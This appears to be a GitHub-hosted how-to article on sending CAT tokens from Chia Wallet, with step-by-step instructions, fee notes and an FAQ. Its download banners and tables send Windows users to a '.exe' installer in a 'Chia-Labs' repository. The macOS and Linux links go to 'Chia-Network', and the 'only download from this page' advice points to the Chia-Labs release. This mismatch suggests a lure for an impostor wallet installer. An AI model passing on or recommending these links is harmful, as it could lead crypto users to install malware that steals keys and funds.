<div align="center">

![Chia Wallet](../assets/banner-article.png)

</div>

<h1 align="center">How to send a CAT token from Chia Wallet</h1>

<p align="center">CATs, offers and NFTs, explained in order.</p>

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

Send a CAT by choosing the token in the asset selector, entering the recipient's `xch1` address and the amount, and confirming. The token needs its own wallet in your app before you can spend it, the recipient needs the same token added to see it, and an optional fee applies exactly as it does for XCH.

## The token has to exist in your wallet first

A CAT is held by the same key as your XCH but tracked as a separate asset. Before you can send one, the wallet must know about it: adding the token by its asset ID creates the token wallet and shows the balance. Without that step the wallet has nothing to spend from.

[The Chia Wallet token guide](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) covers the identification step, including why the asset ID rather than the token's name is the thing to check. Sending to a token you have not added is the most common reason a transfer appears impossible.

## Sending step by step

1. Open the wallet and confirm it is synced.
2. Choose send, then select the token as the asset rather than XCH.
3. Paste the recipient's `xch1` address and compare the first and last characters.
4. Enter the amount in token units, not in XCH.
5. Add a fee if the transfer is time-sensitive.
6. Review the confirmation screen: asset, amount, address, fee.
7. Confirm and watch for pending, then confirmed.

The asset selector is the step that goes wrong. Sending XCH to someone expecting a token is a completed transfer of the wrong asset, and it cannot be undone. Reading the confirmation screen - which names the asset - is the check that catches it.

## The recipient must be able to see the token

A wallet only shows assets it tracks. If the recipient has never added this token, the transfer succeeds and their wallet shows nothing until they add it by asset ID. That is expected rather than a failed send, and it is the single most common "my tokens never arrived" conversation.

Tell the recipient the asset ID before you send, especially for a first transfer of an unfamiliar token. It saves both sides an hour of comparing transaction IDs.

## Addresses, amounts and units

Token transfers use the same `xch1` address format as XCH, because the address identifies a puzzle hash rather than an asset. The amount, however, is in token units: one CAT is one unit of that token, whatever its market price happens to be. There is no conversion step in the wallet.

Amounts are stored as whole units, and some tokens use very large or very small quantities. Check the decimal place twice, then check it again on the confirmation screen. [Mojos and Chia Wallet fees](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) explains the underlying integer model that makes those decimals a display convention.

## Fees on a token transfer

A CAT transfer accepts an optional fee, like an XCH send. One behaviour surprises people: a token transfer that includes a fee can produce a second fee transaction in the XCH wallet, because the fee is paid in XCH. That is bookkeeping rather than a double charge, and both entries belong to the same transfer.

If the network is busy, a small fee shortens the wait. [A pending transaction](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/why-a-chia-transaction-is-pending.md) covers what to do when one sits unconfirmed, and the answer is the same for tokens as for XCH.

## When a token send does not appear

<div align="center">

| What the recipient sees | Cause | Fix |
| --- | --- | --- |
| Nothing at all | Token not added on their side | Add by asset ID |
| Balance unchanged but history shows a transfer | Display lag or unsynced wallet | Wait for sync |
| A different token appears | Wrong asset selected when sending | Compare asset IDs |
| Nothing, and no transaction ID | The send never broadcast | Check the sender's connection |

</div>

The third row is worth dwelling on: two tokens can share a name, and only their IDs distinguish them. [Is Chia Wallet safe](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/is-chia-wallet-safe.md) is a different question, but the discipline is identical - verify the identifier, not the label.

## Keeping token transfers clean

Keep a list of the asset IDs you hold, so a reinstall or a second machine can be checked against it. Run the current release from the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5), because the token screens and the asset selector follow the release. And send a small first amount for any token you have not transferred before.

[Offers](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) are the other way to move a token, and they are the better tool when you want a trade rather than a gift. Updating keeps the screens described here current.

## What the recipient needs on their side

A CAT only appears in a wallet that knows its asset ID. If the recipient has never added that token, the payment arrives as an unknown asset rather than a named one, which looks like a failed send from their side. Send the asset ID along with the payment, and keep a little XCH in your own wallet: the fee is paid in XCH, never in the token you are moving.

## Frequently asked questions

### How do I send a CAT to someone else?

Select the token as the asset, paste their `xch1` address, enter the amount and confirm after checking the asset and amount on the summary.

### Why can't I see the token I want to send?

The wallet does not track it yet. Add the token by its asset ID first.

### Does the recipient need to do anything?

Yes. They must add the same token by asset ID to see the balance, even though the transfer itself is complete.

### Do token transfers cost a fee?

An optional fee applies, paid in XCH, and it can appear as a separate fee entry in the XCH wallet.

### Can I send a CAT to an exchange?

Only if the exchange supports that specific token and gives you a deposit address for it. A generic XCH address is not a token deposit address.

---

## Download Chia Wallet

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

## Related guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Offer expired or not taken](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) | The 7-day default, the fee at take time and the trade that lapsed. |
| [What is a mojo](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) | The smallest unit of XCH and how it becomes a transaction fee. |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Create a chia offer](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) | Build the trade, set the expiry and publish it without exposing keys. |

</div>
